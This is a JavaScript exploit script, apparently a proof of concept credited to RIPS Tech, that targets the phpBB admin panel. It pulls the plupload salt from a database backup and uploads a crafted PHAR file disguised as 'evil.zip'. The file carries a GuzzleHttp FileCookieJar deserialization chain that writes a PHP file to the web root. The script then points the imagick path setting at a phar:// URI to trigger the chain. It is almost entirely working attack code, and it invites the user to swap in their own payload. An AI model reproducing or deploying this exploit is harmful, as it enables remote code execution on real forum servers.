// All greets goes to RIPS Tech
// Run this JS on Attachment Settings ACP page
var plupload_salt = '';
var form_token = '';
var creation_time = '';
var filepath = 'phar://./../files/plupload/$salt_aaae9cba5fdadb1f0c384934cd20d11czip.part'; // md5('evil.zip') = aaae9cba5fdadb1f0c384934cd20d11czip
// your payload here
var payload = '<?php __HALT_COMPILER(); ?>\x0d\x0a\xfe\x01\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00\x01'+'\x00'.repeat(5)+'\xc8\x01\x00\x00O:31:"GuzzleHttp\x5cCookie\x5cFileCookieJar":4:{s:41:"\x00GuzzleHttp\x5cCookie\x5cFileCookieJar\x00filename";s:30:"/var/www/html/phpBB3/pinfo.php";s:52:"\x00GuzzleHttp\x5cCookie\x5cFileCookieJar\x00storeSessionCookies";b:1;s:36:"\x00GuzzleHttp\x5cCookie\x5cCookieJar\x00cookies";a:1:{i:0;O:27:"GuzzleHttp\x5cCookie\x5cSetCookie":1:{s:33:"\x00GuzzleHttp\x5cCookie\x5cSetCookie\x00data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:17:"<?php phpinfo();#";}}}s:39:"\x00GuzzleHttp\x5cCookie\x5cCookieJar\x00strictMode";N;}\x08\x00\x00\x00test.txt\x04\x00\x00\x00K>\x10\x5c\x04\x00\x00\x00\x0c~\x7f\xd8\xb6\x01'+'\x00'.repeat(6)+'test\xa0\x17\xd2\xe0R\xcf \xf6T\x1d\x01X\x91(\x9dD]X\x0b>\x02\x00\x00\x00GBMB';
var byteArray = Uint8Array.from(payload, function(c){return c.codePointAt(0);});
var sid = (new URL(document.location.href)).searchParams.get('sid');
var url = '/adm/index.php';
var getparams = {
    'i': 'acp_database',
    'sid': sid,
    'mode': 'backup'
};
$.get(url, getparams, function(data) {
    form_token = $(data).find('[name="form_token"]').val();
    creation_time = $(data).find('[name="creation_time"]').val();
    if(form_token && creation_time) {
        var posturl = '/adm/index.php?i=acp_database&sid=|&mode=backup&action=download';
        var postdata = {
            'type': 'data',
            'method': 'text',
            'where': 'download',
            'table[]': 'phpbb_config',
            'submit': 'Submit',
            'creation_time': creation_time,
            'form_token': form_token
        }
        $.post(posturl.replace("|", sid), postdata, function (data) {
            plupload_salt = data.match(/plupload_salt',\s*'(\w{32})/)[1];
            if (plupload_salt) {
                filepath = filepath.replace("$salt", plupload_salt);
                var postdata = new FormData();
                postdata.append('name', 'evil.zip');
                postdata.append('chunk', 0);
                postdata.append('chunks', 2);
                postdata.append('add_file', 'Add the file');
                postdata.append('real_filename', 'evil.zip');
                // file
                var pharfile = new File([byteArray], 'evil.zip');
                postdata.append('fileupload', pharfile);
                jQuery.ajax({
                    url: '/posting.php?mode=reply&f=2&t=1',
                    data: postdata,
                    cache: false,
                    contentType: false,
                    processData: false,
                    method: 'POST',
                    success: function(data){
                        if ("id" in data) {
                            $('#img_imagick').val(filepath).focus();
                            $('html, body').animate({
                                scrollTop: ($('#submit').offset().top)
                            }, 500);
                        }
                    }
                });

            }
        }, 'text');
    }
});
